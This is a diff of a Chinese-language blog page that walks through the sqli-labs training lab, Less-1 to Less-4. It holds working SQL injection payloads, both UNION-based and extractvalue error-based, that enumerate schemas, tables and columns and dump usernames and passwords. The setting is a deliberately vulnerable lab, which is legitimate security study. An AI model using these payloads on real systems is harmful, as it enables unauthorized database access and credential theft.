@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      730 字
+      719 字
     </span>
   
 
@@ -227,12 +227,16 @@
             <h1 style="display: none">sqli-labs（一）</h1>
             
             <div class="markdown-body">
-              <h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p>
-<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><ol>
+              <h1>Sqli-labs</h1>
+<p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p>
+<h2 id="类型判断"><a class="header-anchor" href="#类型判断">🍭</a>类型判断</h2>
+<ol>
 <li><code>?id=1 and 1=2 --+</code>若返回结果正常，说明不是数字类型；</li>
-<li><code>?id=1&#39; --+</code> 显示不正常,<code>?id=1&#39;) --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li>
+<li><code>?id=1' --+</code> 显示不正常,<code>?id=1') --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li>
 </ol>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h4 id="法一：UNION联合查询注入"><a href="#法一：UNION联合查询注入" class="headerlink" title="法一：UNION联合查询注入"></a>法一：UNION联合查询注入</h4><ol>
+<h2 id="Less-1"><a class="header-anchor" href="#Less-1">🍭</a>Less-1</h2>
+<h4 id="法一：UNION联合查询注入"><a class="header-anchor" href="#法一：UNION联合查询注入">🍭</a>法一：UNION联合查询注入</h4>
+<ol>
 <li>用and 1=2测试 ，页面回显正常，所以该地方不是数值查询。</li>
 <li>尝试在id后面加上’，页面回显不正常，可能存在SQL字符注入。</li>
 <li>用–+将sql后面的语句注视掉后，页面回显正常，则证明这个地方是单引号字符型注入</li>
@@ -242,28 +246,33 @@
 <p>输出结果说明页面有2个显示位。</p>
 <p>6.用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。</p>
 <p><strong>查询数据库名:</strong></p>
-<p> <code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" srcset="/img/loading.gif" alt="12"></p>
+<p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" srcset="/img/loading.gif" alt="12"></p>
 <p><strong>查询所有表名:</strong></p>
-<p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code><img src="/2020/11/08/sqli/13.jpg" srcset="/img/loading.gif" alt="13"></p>
+<p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+</code><img src="/2020/11/08/sqli/13.jpg" srcset="/img/loading.gif" alt="13"></p>
 <p><strong>查列名：</strong></p>
-<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></p>
 <p><img src="/2020/11/08/sqli/14.jpg" srcset="/img/loading.gif" alt="14"></p>
 <p><strong>查询用户名，密码:</strong></p>
 <p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p>
 <p><img src="/2020/11/08/sqli/15.jpg" srcset="/img/loading.gif" alt="15"></p>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h4 id="法二：报错型注入"><a href="#法二：报错型注入" class="headerlink" title="法二：报错型注入"></a>法二：报错型注入</h4><p>因less1-4的步骤类似，故报错型注入以less3为例。</p>
-<p>输入单引号报错，输入 –+后仍报错，故不是简单的单引号报错；输入<code>?id=1&#39;) --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p>
+<h2 id="Less-3"><a class="header-anchor" href="#Less-3">🍭</a>Less-3</h2>
+<h4 id="法二：报错型注入"><a class="header-anchor" href="#法二：报错型注入">🍭</a>法二：报错型注入</h4>
+<p>因less1-4的步骤类似，故报错型注入以less3为例。</p>
+<p>输入单引号报错，输入 --+后仍报错，故不是简单的单引号报错；输入<code>?id=1') --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p>
 <p><strong>爆表</strong></p>
 <p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p>
 <p><img src="/2020/11/08/sqli/16.jpg" srcset="/img/loading.gif" alt="16"></p>
 <p><strong>爆列</strong></p>
 <p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img src="/2020/11/08/sqli/17.jpg" srcset="/img/loading.gif" alt="17"></p>
-<p><strong>爆值</strong><br> <code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p>
+<p><strong>爆值</strong><br>
+<code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p>
 <p><img src="/2020/11/08/sqli/18.jpg" srcset="/img/loading.gif" alt="18"></p>
-<p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p>
+<p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+</code></p>
 <p><img src="/2020/11/08/sqli/19.jpg" srcset="/img/loading.gif" alt="19"></p>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入单引号不报错，<code>?id=1&#39;)</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>
+<h2 id="Less-2"><a class="header-anchor" href="#Less-2">🍭</a>Less-2</h2>
+<p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p>
+<h2 id="Less-4"><a class="header-anchor" href="#Less-4">🍭</a>Less-4</h2>
+<p>输入单引号不报错，<code>?id=1')</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>
 
             </div>
             <hr>
